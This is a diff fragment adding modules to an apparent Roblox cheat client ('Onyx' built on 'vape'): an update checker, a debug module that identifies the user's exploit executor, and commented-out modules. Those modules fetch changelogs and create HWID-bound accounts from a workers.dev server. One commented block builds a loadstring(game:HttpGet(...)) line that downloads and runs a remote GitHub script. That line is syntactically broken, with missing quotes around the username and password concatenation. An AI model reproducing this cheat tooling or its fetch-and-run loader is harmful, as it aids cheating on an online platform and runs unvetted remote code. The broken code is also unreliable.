+        Tooltip = 'Checks whenever an update is available from the main server'
+    })
+
+    task.spawn(function()
+        repeat task.wait(1) until vape.Loaded or vape.Loaded == nil
+        if vape.Loaded and not UpdateChecker.Enabled then
+            UpdateChecker:Toggle(true)
+        end
+    end)
+end)
+
+--[[run(function()
+    local ChangeLogs
+    ChangeLogs = vape.Categories.Minigames:CreateModule({
+        Name = "ChangeLogs",
+        Function = function(callback)
+			local success, response = pcall(function()
+                return game:HttpGet("https://onyxclient.fsl58.workers.dev/changelogs")
+            end)
+            if not callback then lplr:FindFirstChild("PlayerGui"):FindFirstChild("Logs"):Destroy() return end
+            local decoded = nil
+            pcall(function()
+            	decoded = game:GetService("HttpService"):JSONDecode(response)
+            end)
+			
+			local function CreateLogs()
+				local Profile = createlib:Create("ScreenGui", {
+					Name = "Logs",
+					DisplayOrder = 30,
+					ResetOnSpawn = false,
+					Parent = lplr:WaitForChild("PlayerGui"),
+					IgnoreGuiInset = true
+				})
+		
+				local BackgroundProfileUI = createlib:Create("ImageButton", {
+					Name = "Background",
+					AutoButtonColor = false,
+					AnchorPoint = Vector2.new(0.5, 0.5),
+					BackgroundTransparency = 0.6,
+					BackgroundColor3 = Color3.new(0, 0, 0),
+					Position = UDim2.fromScale(0.5, 0.5),
+					Size = UDim2.fromScale(2, 2),
+					Parent = Profile
+				})
+		
+				local MainProfileFrame = createlib:Create("Frame", {
+					Name = "Main",
+					Parent = Profile,
+					BackgroundTransparency = 1,
+					Size = UDim2.fromScale(1, 1)
+				})
+		
+				local MainMainBG = createlib:Create("ImageButton", {
+					Name = "MainBG",
+					AutoButtonColor = false,
+					AnchorPoint = Vector2.new(0.5, 0),
+					BackgroundTransparency = 1,
+					Position = UDim2.fromScale(0.5, 0.05),
+					Size = UDim2.fromOffset(800, 700),
+					Parent = MainProfileFrame
+				})
+		
+				createlib:Create("UIAspectRatioConstraint", { Parent = MainMainBG, AspectRatio = 1.143 })
+				createlib:Create("UIScale", { Parent = MainMainBG, Scale = 1.297 })
+		
+				local IconButtonWrapper = createlib:Create("ImageButton", {
+					Name = "IconButtonWrapper",
+					Parent = MainMainBG,
+					AnchorPoint = Vector2.new(1, 0),
+					BackgroundTransparency = 1,
+					Position = UDim2.new(1, -4, 0, 4),
+					Size = UDim2.fromOffset(40, 40)
+				})
+				createlib:Create("UICorner", { CornerRadius = UDim.new(1, 0), Parent = IconButtonWrapper })
+				createlib:Create("UIPadding", {
+					PaddingBottom = UDim.new(0.1, 0),
+					PaddingLeft = UDim.new(0.1, 0),
+					PaddingRight = UDim.new(0.1, 0),
+					PaddingTop = UDim.new(0.1, 0),
+					Parent = IconButtonWrapper
+				})
+				createlib:Create("ImageLabel", {
+					Name = "Icon",
+					Parent = IconButtonWrapper,
+					AnchorPoint = Vector2.new(0.5, 0.5),
+					BackgroundTransparency = 1,
+					Position = UDim2.fromScale(0.5, 0.5),
+					Size = UDim2.fromScale(1, 1),
+					ZIndex = 100,
+					Image = "rbxassetid://6693945013",
+					ImageTransparency = 0.2
+				})
+		
+				local FrameMainBG = createlib:Create("Frame", {
+					Parent = MainMainBG,
+					BackgroundColor3 = Color3.fromRGB(100, 103, 167),
+					Size = UDim2.fromScale(1, 1)
+				})
+				createlib:Create("UICorner", { CornerRadius = UDim.new(0.05, 0), Parent = FrameMainBG })
+				createlib:Create("UIListLayout", {
+					Parent = FrameMainBG,
+					FillDirection = Enum.FillDirection.Vertical,
+					SortOrder = Enum.SortOrder.LayoutOrder
+				})
+		
+				local UserFrame = createlib:Create("Frame", {
+					Name = "UserFrame",
+					Size = UDim2.fromScale(1, 1),
+					BackgroundColor3 = Color3.fromRGB(78, 80, 130),
+					Parent = FrameMainBG
+				})
+				createlib:Create("UICorner", { CornerRadius = UDim.new(0, 8), Parent = UserFrame })
+		
+				local BGImage = createlib:Create("ImageLabel", {
+					Name = "BGImage",
+					Parent = UserFrame,
+					BackgroundTransparency = 1,
+					Position = UDim2.fromScale(0.05, 0.05),
+					Size = UDim2.new(0.9, 0, 0.9, 0),
+					Image = "rbxassetid://71356717298935",
+					ScaleType = Enum.ScaleType.Crop,
+					ImageTransparency = 0.38
+				})
+				createlib:Create("UICorner", { CornerRadius = UDim.new(0, 8), Parent = BGImage })
+				local Text = createlib:Create("TextLabel", {Name = "ChangeLogs",Text = decoded, Position = UDim2.fromScale(0,0), Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, TextScaled = true, Parent = UserFrame})
+			end
+			CreateLogs()
+		end,
+        Tooltip = 'Fetches a the newest logs'
+    })
+
+
+end)--]]
+
+run(function()
+	local GetExecutor	
+	GetExecutor = vape.Categories.Minigames:CreateModule({
+		Name = "GetExecutor",
+		Tooltip = "gets ur current exectuor(USED FOR DEBUGGING)",
+		Function = function(callback)
+			if callback then
+				task.spawn(function()
+				GetExecutor:Toggle(false)
+				local timer = 4.5
+					vape:CreateNotification('Onyx', "Currently searching for your executor", timer)
+					if identifyexecutor then
+					task.wait(timer + 0.5)
+						vape:CreateNotification("Onyx", "Could find your executor '"..identifyexecutor().."'", 20,'success')
+					else
+						vape:CreateNotification("Onyx", "Couldn't find your function 'identifyexecutor' for your executor", 5,"alert")
+					end
+				end)
+			end
+		end	
+	})
+end)
+
+
+--[[run(function()
+    local http = game:GetService("HttpService")
+    local req = request or http_request or syn.request
+
+    local function sendCreateRequest()
+        local url = "https://onyxclient.fsl58.workers.dev/create"
+
+        local body = {
+            username = "",
+            password = ""
+        }
+
+        return req({
+            Url = url,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = http:JSONEncode(body)
+        })
+    end
+
+    local CA = vape.Categories.Minigames:CreateModule({
+        Name = "Create Account",
+        Tooltip = "Only for guests -- creates an official Onyx account with HWID bound.",
+        Function = function(cb)
+            if not cb then return end
+
+            vape:CreateNotification("Onyx", "Creating account...", 4)
+
+            local res = sendCreateRequest()
+
+            if not res or res.StatusCode ~= 200 then
+                vape:CreateNotification("Onyx", "Failed to contact server.", 5, "alert")
+                return
+            end
+
+            local data = http:JSONDecode(res.Body)
+            if data.error then
+                vape:CreateNotification("Onyx", "Server error: " .. data.error, 5, "alert")
+                return
+            end
+
+            local newuser = data.username
+            local newpass = data.password
+
+            vape:CreateNotification("Onyx", "Account created! Copied to clipboard.", 6)
+
+            local info = 
+
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/soryed/OynxVAPEv4/main/NewMainScript.lua", true))({
+    username =  .. newuser .. ,
+    password =  .. newpass .. 
+})
+           
+
+            setclipboard(info)
+            CA:Toggle(false)
+        end
+    })
+end)--]]
